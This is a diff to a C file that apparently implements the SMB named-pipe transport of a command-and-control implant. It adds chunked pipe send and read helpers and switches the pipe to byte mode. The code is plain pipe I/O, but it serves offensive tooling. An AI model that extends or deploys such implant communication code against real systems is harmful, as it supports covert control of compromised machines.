@@ -3,9 +3,43 @@
 #include <Core/TransportSmb.h>
 #include <Core/MiniStd.h>
 
-#ifdef TRANSPORT_SMB
+#define PIPE_BUFFER_MAX 0x10000 - 1
+#define MAX(a,b) ((a) > (b) ? (a) : (b))
+#define MIN(a,b) ((a) < (b) ? (a) : (b))
 
-#define PIPE_BUFFER_MAX 0x10000
+BOOL PipeSend(HANDLE pipeHandle, PBUFFER Send)  
+{
+    DWORD bytesWritten;
+    DWORD totalBytesWritten = 0;
+    do {
+        if (!Instance.Win32.WriteFile(pipeHandle, Send->Buffer + totalBytesWritten, MIN((Send->Length - totalBytesWritten), PIPE_BUFFER_MAX), &bytesWritten , NULL)) {
+            return FALSE;
+        }
+        totalBytesWritten += bytesWritten;
+    } while (totalBytesWritten < Send->Length);
+    
+    return TRUE;
+}
+
+BOOL PipeRead(HANDLE pipeHandle, PBUFFER Resp) 
+{
+    DWORD bytesRead;
+    DWORD totalBytesRead = 0;
+    do {
+        if (! Instance.Win32.ReadFile(pipeHandle, Resp->Buffer + totalBytesRead, MIN((Resp->Length - totalBytesRead), PIPE_BUFFER_MAX), &bytesRead, NULL)) {
+            if (NtGetLastError() != ERROR_MORE_DATA) {
+                return FALSE;
+            }
+           
+        }
+
+        totalBytesRead += bytesRead;
+    } while (totalBytesRead < Resp->Length);
+
+    return TRUE;
+}
+
+#ifdef TRANSPORT_SMB
 
 BOOL SmbSend( PBUFFER Send )
 {
@@ -19,8 +53,8 @@ BOOL SmbSend( PBUFFER Send )
 
         Instance.Config.Transport.Handle = Instance.Win32.CreateNamedPipeW( Instance.Config.Transport.Name,  // Named Pipe
                                                                             PIPE_ACCESS_DUPLEX,              // read/write access
-                                                                            PIPE_TYPE_MESSAGE     |          // message type pipe
-                                                                            PIPE_READMODE_MESSAGE |          // message-read mode
+                                                                            PIPE_TYPE_BYTE     |             // byte type pipe
+                                                                            PIPE_READMODE_BYTE |             // byte-read mode
                                                                             PIPE_WAIT,                       // blocking mode
                                                                             PIPE_UNLIMITED_INSTANCES,        // max. instances
                                                                             PIPE_BUFFER_MAX,                 // output buffer size
@@ -40,11 +74,11 @@ BOOL SmbSend( PBUFFER Send )
             return FALSE;
         }
 
-        /* Send the message/package we want to send to the new client... */
-        return Instance.Win32.WriteFile( Instance.Config.Transport.Handle, Send->Buffer, Send->Length, &Send->Length, NULL );
+        return PipeSend(Instance.Config.Transport.Handle, Send);
     }
 
-    if ( ! Instance.Win32.WriteFile( Instance.Config.Transport.Handle, Send->Buffer, Send->Length, &Send->Length, NULL ) )
+    /* Send the message/package we want to send to the new client... */
+    if ( ! PipeSend(Instance.Config.Transport.Handle, Send) )
     {
         PRINTF( "WriteFile Failed:[%d]\n", NtGetLastError() );
 
@@ -59,6 +93,8 @@ BOOL SmbSend( PBUFFER Send )
 
             Instance.Session.Connected = FALSE;
         }
+
+        return FALSE;
     }
 
     return TRUE;
@@ -88,7 +124,8 @@ BOOL SmbRecv( PBUFFER Resp )
             Instance.Win32.ReadFile( Instance.Config.Transport.Handle, &PackageSize, sizeof( UINT32 ), &BytesSize, NULL );
 
             Resp->Buffer = Instance.Win32.LocalAlloc( LPTR, PackageSize );
-            if ( ! Instance.Win32.ReadFile( Instance.Config.Transport.Handle, Resp->Buffer, PackageSize, &Resp->Length, NULL ) )
+            Resp->Length = PackageSize;
+            if (!PipeRead(Instance.Config.Transport.Handle, Resp))
             {
                 /* We failed to read from the pipe. cleanup. */
 
